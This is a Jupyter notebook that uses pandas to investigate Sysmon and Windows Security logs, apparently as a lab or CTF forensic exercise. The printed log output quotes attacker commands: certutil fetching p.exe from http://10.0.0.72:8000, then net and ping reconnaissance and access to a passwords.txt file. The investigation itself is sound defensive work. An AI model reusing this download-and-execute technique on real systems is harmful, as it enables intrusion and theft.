# %%
import pandas as pd
import re

pd.set_option('display.max_columns', None)
pd.set_option('display.max_rows', None)
pd.set_option('display.max_colwidth', None)

# %%
sysmon_noabar = pd.read_json("sysmon.json")

# %%
sysmon_noabar.head()
# Out:
#            Configuration  EventId  \
# 0  c:\windows\config.xml       16
# 1                    NaN        4
# 2                    NaN        1
# 3                    NaN        1
# 4                    NaN        5
#
#                                                      ConfigurationFileHash  \
# 0  SHA256=6FEEC7BA4B298F2124A9F0216D1B8C1A577DC89BB54FA4665E0401E3A0B1B8DA
# 1                                                                      NaN
# 2                                                                      NaN
# 3                                                                      NaN
# 4                                                                      NaN
#
#                    UtcTime  SchemaVersion    State  Version  \
# 0  2021-06-20 13:26:43.608            NaN      NaN      NaN
# 1  2021-06-20 13:26:43.780            4.7  Started    13.21
# 2  2021-06-20 13:26:43.649            NaN      NaN      NaN
# ...

# %%
sysmon_noabar.EventId.value_counts()
# Out:
# 1     6822
# 13    2169
# 11    1474
# 22     397
# 5      301
# 16     274
# 3      107
# 12      42
# 4        2
# 2        1
# Name: EventId, dtype: int64

# %%
noabar_proc = sysmon_noabar[sysmon_noabar.EventId == 1].dropna(axis=1)

# %%
noabar_proc.head()
# Out:
#    EventId                  UtcTime  \
# 2        1  2021-06-20 13:26:43.649
# 3        1  2021-06-20 13:26:43.732
# 7        1  2021-06-20 13:30:47.062
# 8        1  2021-06-20 13:30:47.235
# 9        1  2021-06-20 13:30:47.506
#
#                                   ParentCommandLine  \
# 2                  C:\Windows\system32\services.exe
# 3  C:\Windows\system32\svchost.exe -k DcomLaunch -p
# 7  C:\Windows\system32\svchost.exe -k DcomLaunch -p
# 8     C:\Windows\system32\svchost.exe -k netsvcs -p
# 9                  C:\Windows\system32\services.exe
#
#                                                          Description  \
# 2                                            System activity monitor
# 3  Sink to receive asynchronous callbacks for WMI client application
# 7                                          MoUSO Core Worker Process
# 8                                     Host Process for Windows Tasks
# 9                                          Windows Modules Installer
#
# ...

# %%
noabar_proc["Image"].value_counts(ascending=True)
# Out:
# C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.341.1306.0.exe                                                               1
# C:\Windows\Temp\E9653189-27EA-47B7-A0C5-8BA39E95F1CD\MpSigStub.exe                                                                             1
# C:\Windows\System32\spoolsv.exe                                                                                                                1
# C:\Windows\SoftwareDistribution\Download\Install\AM_Base_Patch1.exe                                                                            1
# C:\Windows\System32\dxgiadaptercache.exe                                                                                                       1
# C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.341.1110.0.exe                                                               1
# ...

# %%
noabar_proc[(noabar_proc.Image.str.contains('(users)',regex=True,case=False)) & (~noabar_proc.Image.str.contains('(OneDrive)',regex=True,case=False, na=False))]
# Out:
# C:\Users\medmondson\anaconda3\lib\site-packages\pandas\core\strings.py:2001: UserWarning: This pattern has match groups. To actually get the groups, use str.extract.
#   return func(self, *args, **kwargs)
#        EventId                  UtcTime  \
# 11351        1  2021-07-11 12:48:25.714
# 11398        1  2021-07-11 12:53:49.888
#
#                                                   ParentCommandLine  \
# 11351  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
# 11398  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
#
#       Description                CommandLine    CurrentDirectory  \
# 11351           -  "C:\Users\ljessica\p.exe"  C:\Users\ljessica\
# 11398           -  "C:\Users\ljessica\p.exe"  C:\Users\ljessica\
#
#                                                                                                                                                       Hashes  \
# ...

# %%
noabar_proc[noabar_proc.ProcessGuid=="{8c6b9a35-e899-60ea-b85d-e70000000000}"]
# Out:
#        EventId                  UtcTime  \
# 11351        1  2021-07-11 12:48:25.714
#
#                                                   ParentCommandLine  \
# 11351  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
#
#       Description                CommandLine    CurrentDirectory  \
# 11351           -  "C:\Users\ljessica\p.exe"  C:\Users\ljessica\
#
#                                                                                                                                                       Hashes  \
# 11351  MD5=665DA691741BCF914EFB2A38E8165ED6,SHA256=C306B681651514A16A791E1B0D3F284417646B4BA79F6AB1DBB1B151CCDDD927,IMPHASH=B4C6FFF030479AA3B12625BE67BF4914
#
#                          Image                             ProcessGuid  \
# 11351  C:\Users\ljessica\p.exe  {8c6b9a35-e899-60ea-b85d-e70000000000}
#
#       Company IntegrityLevel FileVersion           User RuleName Product  \
# 11351       -         Medium           -  DUNE\ljessica        -       -
# ...

# %%
noabar_proc[(noabar_proc.Image.str.contains('(certutil)',regex=True,case=False))]
# Out:
# C:\Users\medmondson\anaconda3\lib\site-packages\pandas\core\strings.py:2001: UserWarning: This pattern has match groups. To actually get the groups, use str.extract.
#   return func(self, *args, **kwargs)
#        EventId                  UtcTime  \
# 11345        1  2021-07-11 12:47:52.779
# 11346        1  2021-07-11 12:48:01.764
#
#                                                   ParentCommandLine  \
# 11345  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
# 11346  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
#
#         Description  \
# 11345  CertUtil.exe
# 11346  CertUtil.exe
#
#                                                                              CommandLine  \
# 11345        "C:\Windows\system32\certutil.exe" -urlcache -f http://10.0.0.72:8000/p.exe
# 11346  "C:\Windows\system32\certutil.exe" -urlcache -f http://10.0.0.72:8000/p.exe p.exe
#
#          CurrentDirectory  \
# 11345  C:\Users\ljessica\
# 11346  C:\Users\ljessica\
#
# ...

# %%
noabar_proc[(noabar_proc.Image.str.contains('(ping)',regex=True,case=False))]
# Out:
# C:\Users\medmondson\anaconda3\lib\site-packages\pandas\core\strings.py:2001: UserWarning: This pattern has match groups. To actually get the groups, use str.extract.
#   return func(self, *args, **kwargs)
#        EventId                  UtcTime  \
# 11438        1  2021-07-11 13:02:58.214
# 11439        1  2021-07-11 13:03:33.406
# 11468        1  2021-07-11 13:09:41.595
#
#                                                   ParentCommandLine  \
# 11438                                   C:\Windows\system32\cmd.exe
# 11439                                   C:\Windows\system32\cmd.exe
# 11468  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
#
#                Description                            CommandLine  \
# 11438  TCP/IP Ping Command                        ping  10.0.0.37
# 11439  TCP/IP Ping Command                        ping  10.0.0.52
# 11468  TCP/IP Ping Command  "C:\Windows\system32\PING.EXE" fremen
#
#          CurrentDirectory  \
# 11438  C:\Users\ljessica\
# ...

# %%
noabar_proc[noabar_proc.ParentProcessGuid == '{8c6b9a35-eb88-60ea-d5b0-eb0000000000}']
# Out:
#        EventId                  UtcTime            ParentCommandLine  \
# 11433        1  2021-07-11 13:01:03.559  C:\Windows\system32\cmd.exe
# 11435        1  2021-07-11 13:01:12.367  C:\Windows\system32\cmd.exe
# 11437        1  2021-07-11 13:01:19.771  C:\Windows\system32\cmd.exe
# 11438        1  2021-07-11 13:02:58.214  C:\Windows\system32\cmd.exe
# 11439        1  2021-07-11 13:03:33.406  C:\Windows\system32\cmd.exe
#
#                Description      CommandLine    CurrentDirectory  \
# 11433          Net Command   net  computers  C:\Users\ljessica\
# 11435          Net Command    net  computer  C:\Users\ljessica\
# 11437          Net Command        net  view  C:\Users\ljessica\
# 11438  TCP/IP Ping Command  ping  10.0.0.37  C:\Users\ljessica\
# 11439  TCP/IP Ping Command  ping  10.0.0.52  C:\Users\ljessica\
#
#                                                                                                                                                       Hashes  \
# ...

# %%
security_noabar = pd.read_json("security.json")

# %%
security_noabar.EventId.value_counts()
# Out:
# 4663    17908
# 4664     2372
# 4660      910
# 4670      178
# 4697       19
# 4611       12
# 4688       11
# 4622       10
# 4985        6
# 4614        2
# 1100        1
# 4696        1
# 4616        1
# 4826        1
# 4610        1
# Name: EventId, dtype: int64

# %%
file_access = security_noabar[security_noabar.EventId==4663].dropna(axis=1)

# %%
file_access.head()
# Out:
#                                                                                                                         ObjectName  \
# 0  C:\Windows\WinSxS\amd64_microsoft-windows-rpc-endpointmapper_31bf3856ad364e35_10.0.19041.662_none_2872266c417996fa\RpcEpMap.dll
# 1        C:\Windows\WinSxS\amd64_microsoft-windows-cryptdll-dll_31bf3856ad364e35_10.0.19041.546_none_e397cce70c94bb9c\cryptdll.dll
# 2                C:\Windows\WinSxS\amd64_microsoft-windows-bootres_31bf3856ad364e35_10.0.19041.1_none_f50dcea7214e5b1f\bootres.dll
# 3              C:\Windows\WinSxS\amd64_microsoft-windows-coreos_31bf3856ad364e35_10.0.19041.546_none_034b8d479d2091ae\imagehlp.dll
# 4                  C:\Windows\WinSxS\amd64_microsoft-windows-csrsrv_31bf3856ad364e35_10.0.19041.1_none_7f78448944bb2844\csrsrv.dll
#
#   SubjectUserName        AccessList SubjectLogonId ObjectServer ObjectType  \
# 0         NOABAR$  %%4420\n\t\t\t\t          0x3e7     Security       File
# ...

# %%
file_access[(~file_access.ProcessName.str.contains('(tiworker)',regex=True,case=False, na=False)) & (~file_access.ProcessName.str.contains('(system32)',regex=True,case=False, na=False)) * (~file_access.ProcessName.str.contains('(microsoft)',regex=True,case=False, na=False))]
# Out:
# C:\Users\medmondson\anaconda3\lib\site-packages\pandas\core\strings.py:2001: UserWarning: This pattern has match groups. To actually get the groups, use str.extract.
#   return func(self, *args, **kwargs)
# C:\Users\medmondson\anaconda3\lib\site-packages\pandas\core\computation\expressions.py:203: UserWarning: evaluating in Python space because the '*' operator is not supported by numexpr for the bool dtype, use '&' instead
#   warnings.warn(
#                                     ObjectName SubjectUserName  \
# 21431  C:\Users\ljessica\Desktop\passwords.txt        ljessica
#
#              AccessList SubjectLogonId ObjectServer ObjectType  \
# 21431  %%4416\n\t\t\t\t       0xd3d7ac     Security       File
#
#                                        SubjectUserSid  EventId AccessMask  \
# 21431  S-1-5-21-3248287364-1445653286-2214283038-1109     4663        0x1
#
#       SubjectDomainName              ProcessName ProcessId HandleId
# ...
